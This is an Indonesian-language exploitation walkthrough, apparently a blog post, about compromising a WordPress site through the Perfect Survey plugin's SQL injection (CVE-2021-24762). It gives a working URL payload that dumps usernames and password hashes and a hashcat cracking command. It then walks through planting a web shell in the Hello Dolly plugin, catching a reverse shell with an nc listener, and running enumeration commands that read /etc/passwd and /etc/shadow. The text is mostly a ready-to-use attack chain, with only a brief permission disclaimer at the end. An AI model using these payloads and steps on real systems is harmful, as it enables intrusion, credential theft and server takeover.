# Uploading a Shell in WordPress via SQLi Entry Point

## Informasi Target

Targetnya adalah situs web WordPress. Setelah enumerasi dan pengujian ekstensif terhadap berbagai parameter (misalnya, ID, p, pencarian), tidak ditemukan kerentanan pada awalnya.

## Penemuan Kerentanan

Dengan menggunakan WPScan, saya mengidentifikasi kerentanan CVE kritis pada plugin Perfect Survey:

```
Perfect Survey < 1.5.2 — Injeksi SQL Tanpa Otentikasi:
CVE-2021–24762: https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad 
```

## payload Eksploitasi

payload  yang digunakan untuk mengeksploitasi kerentanan ini adalah:


```bash
/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users ​ ​ ​ ​ ​ ​ 
```

**Contoh**


```bash
https://example.com/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ 
```

` question_id` harus diawali dengan ID postingan yang sudah ada. Setelah menjalankan payload ini, kredensial pengguna bocor, termasuk kata sandi yang di-hash. 

## Cracking the Hash

Dengan menggunakan Hashcat, hash tersebut berhasil dipecahkan:

```bash
hashcat -m 400 -a 0  'hash' 
```

Kata sandi langsung terungkap. Menggunakan kredensial yang berhasil diretas, saya masuk ke panel admin WordPress. 

## Uploading Web Shell 

1. Masuk ke Panel Admin WordPress:
   - Nama pengguna: `admin`
   - Kata sandi: `crackedhash`

2. Mengedit Plugin:
   - Buka bagian Plugin.
   - Pilih plugin “Hello Dolly”
   - Edit file plugin (misalnya, `hello.php`) untuk menyertakan kode web shell.
   - Perbarui plugin dengan kode yang telah dimodifikasi.

3. Memulai Menjadi Listener:
   - Jalankan program listener di mesin Anda untuk menangkap reverse shell: 

```bash
nc -lnvp 1234
```

4. Mengaktifkan Shell :
  - Kunjungi ` https://target.com/wp-content/plugins/hello.php ` untuk mengaktifkan shell dan mendapatkan akses ke server. 


## Post-Exploitation

Setelah mendapatkan akses shell, periksa hak akses Anda dan lakukan enumerasi sistem untuk mencari file dan data sensitif. Karena pembatasan hak akses, enumerasi mungkin terbatas. 

### Simple Commands for Enumeration

Gunakan perintah sederhana untuk menjelajahi dan mengumpulkan informasi dari server:

```bash
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
```

### Mencari File .txt

Gunakan perintah berikut untuk menemukan semua file `.txt` di direktori `/var/www`:

```bash
find /var/www -  type  f -name  "*.txt" 
```


## Kesimpulan

Proses ini menunjukkan cara memanfaatkan kerentanan yang diketahui di situs WordPress untuk mendapatkan akses tidak sah dan mengunggah shell. Selalu pastikan Anda memiliki izin untuk menguji dan mengeksploitasi kerentanan pada sistem target apa pun. 